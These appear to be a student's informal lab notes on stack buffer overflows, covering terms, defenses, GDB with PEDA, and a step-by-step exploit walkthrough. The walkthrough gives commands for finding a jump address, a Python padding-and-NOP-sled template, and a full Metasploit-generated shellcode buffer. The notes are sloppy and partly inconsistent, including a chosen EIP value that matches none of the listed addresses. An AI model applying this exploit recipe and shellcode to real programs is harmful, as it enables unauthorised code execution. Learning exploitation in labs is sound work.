## Buffer Overflow Common Terms
Heap:                       Memory that can be allocated and deallocated
Stack:                      A contiguous section of memory used for passing arguments
Registers:                  Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP):   a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP):         Contains the address of the next available space on the stack
Base Pointer (BP):          The base of the stack
Function:                   Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode:                  The code that is executed once an exploit successfully takes advantage of a vulnerability

## Buffer Overflow Defenses
    Non executable (NX) stack
    Address Space Layout Randomization (ASLR)
    Data Execution Prevention (DEP)
    Stack Canaries
    Position Independent Executable (PIE)

## Technical Help
### Utilizing tools such as:
    IDA, GHIDRA
    GDB, MONA, IMMUNITY
    BASH, PYTHON

# GDB Uses
## Installation of Peda Plugin
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

## Common Commands
disass <FUNCTION>         #   Disassemble portion of the program
info <...>                #   Supply info for specific stack areas
x/256c $<REGISTER>        #   Read characters from specific register
break <address>           #   Establish a break point

##################################################################
demo/activity
##################################################################
https://sec.cybbh.io/public/security/latest/lessons/lesson-7-exploit_sg.html

1)identify the executable, whic os it runs, and run strings/dynamic/ and ghidra on it
2)run gdb on it after ghidra and find out if its breakable, then break it with an indefinte amount of A's' its alsof faster to do it using the website https://wiremask.eu/tools/buffer-overflow-pattern-generator/.

3)make a .py script
the buffer will be:       " buffer= "A" *76 " <- 76 will change
the nop will alwasy be    " nop= "\x90" * 15 "
the print will be         " print(buffer+eip+nop+buf) "
4) fill out the eip field.
         type:
gdb - env ./func
show env
unset env clumns
unset env rows
then run and break
after breaking it you type ; info proc map
pull the first one under and to the left of heap
pull the last one on the same level and all  the way to the ight of stack.
then run the command "find /b 0xf7def000, 0xfffffe000, 0xff, 0xe4"
the last two are always there, the first tow are the ones you pulled respectively.
once the command is ran youll grab the first four and put them in little endian. 
like this: 
0xf7df1b51 -> 0xf7 df 1b 51 -> "\x51\x1b\xdf\xf7"
0xf7f6674b -> 0xf7 f6 67 4b -> "\x4b\x67\xf6\xf7"
0xf7f72753 -> 0xf7 f7 27 53 -> "\x53\x27\xf7\xf7"
0xf7f72c6b -> 0xf7 f7 2c 6b -> "\x6b\x2c\xf7\xf7"
pick one and pu it in the eip:
eip = "\x59\x3b\xde\xf7"

then replace the shell script.
go into msf
msf6 > use payload/linux/x86/exec
set CMD whoami
generate -b '\x00' -f python

and copy the shellcode 

buf =  b""
buf += b"\xbe\x21\xb8\xbe\x40\xd9\xf7\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x11\x83\xe8\xfc\x31\x70\x0e\x03\x51"
buf += b"\xb6\x5c\xb5\xfb\xcd\xf8\xaf\xa9\xb7\x90\xe2\x2e"
buf += b"\xb1\x86\x95\x9f\xb2\x20\x66\xb7\x1b\xd3\x0f\x29"
buf += b"\xed\xf0\x82\x5d\xf0\xf6\x22\x9d\x68\x96\x56\xbd"
buf += b"\x41\x76\xe4\xd8\xfe\xf4\x6f\x56\x2e\xd7\x19\xf3"
buf += b"\x42\x5e\x95\x9e\xc1\xd2\x3c\x14\x28\x63\xdb\xb6"
buf += b"\x34\xd4\x70\xbf\xd4\x17\xf6"

run and change shit until it wrks.

